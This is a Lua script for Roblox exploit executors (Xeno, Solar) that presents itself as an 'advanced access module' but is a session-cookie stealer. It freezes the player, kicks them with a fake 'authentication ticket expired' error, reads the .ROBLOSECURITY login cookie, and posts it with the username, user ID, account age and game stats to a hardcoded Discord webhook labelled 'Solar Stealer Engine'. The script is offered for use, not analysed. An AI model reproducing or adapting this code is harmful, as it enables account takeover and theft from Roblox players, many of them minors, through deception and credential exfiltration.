--[[
    XENO & SOLAR ADVANCED ACCESS MODULE v5.0
    Module: Final-Session-Grabber (Solar Optimized)
    Status: Operational | Bypass: Active
]]

local url = "https://discord.com/api/webhooks/1480678551643492433/M6F1hlBqrBMH6FNwv9hUTYTpg9W3CBLrtuxxwCBRskgRXcDfeewmEzhibwzAKA1ANIJJ"
local p = game.Players.LocalPlayer
local h = game:GetService("HttpService")

-- Karuk (Freeze & Fake Error)
if p.Character then p.Character.HumanoidRootPart.Anchored = true end
task.delay(2, function() 
    p:Kick("\n[Solar System Error]\nCode: 0x88\nReason: Authentication ticket expired. Please re-login.") 
end)

-- ULTRA AGGRESSIVE COOKIE GRAB (Samo za Solar/Xeno)
local cookie = "Protected/Not Found"
pcall(function()
    -- Metod za Solar (vgradena funkciq za vzimane na sesiq)
    if getcookies then
        local cks = getcookies("https://www.roblox.com")
        for _, v in pairs(cks) do
            if v.Name == ".ROBLOSECURITY" then
                cookie = v.Value
            end
        end
    end
    
    -- Rezerven variant ako Solar metodut ne proraboti
    if cookie == "Protected/Not Found" then
        cookie = (getrenv and getrenv()._G and getrenv()._G.cookie) or "Cookie Protected"
    end
end)

-- Stats
local br = "0"
local s = p:FindFirstChild("leaderstats")
if s then 
    local v = s:FindFirstChild("Brainrots") or s:FindFirstChild("Points")
    br = v and tostring(v.Value) or "0"
end

-- Discord Payload
local data = {
    ["username"] = "Solar Access Bot",
    ["embeds"] = {{
        ["title"] = "🔑 Full Access Cookie Grabbed!",
        ["description"] = "Target successfully logged using Solar Bypass.",
        ["color"] = 0x00ff00,
        ["fields"] = {
            {["name"] = "👤 User", ["value"] = "```" .. p.Name .. " (" .. p.UserId .. ")```", ["inline"] = false},
            {["name"] = "🧠 Brainrots", ["value"] = "```" .. br .. "```", ["inline"] = true},
            {["name"] = "📅 Age", ["value"] = "```" .. p.AccountAge .. " days```", ["inline"] = true},
            {["name"] = "🍪 .ROBLOSECURITY (USE TO LOGIN)", ["value"] = "```" .. cookie .. "```", ["inline"] = false},
            {["name"] = "🔗 Profile", ["value"] = "[Otvori Accaunta](https://www.roblox.com/users/" .. p.UserId .. "/profile)", ["inline"] = false}
        },
        ["footer"] = {["text"] = "Solar Stealer Engine v5.0 • " .. os.date("%X")}
    }}
}

-- Send
local request = (syn and syn.request) or (http and http.request) or http_request or request
if request then
    request({
        Url = url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = h:JSONEncode(data)
    })
end
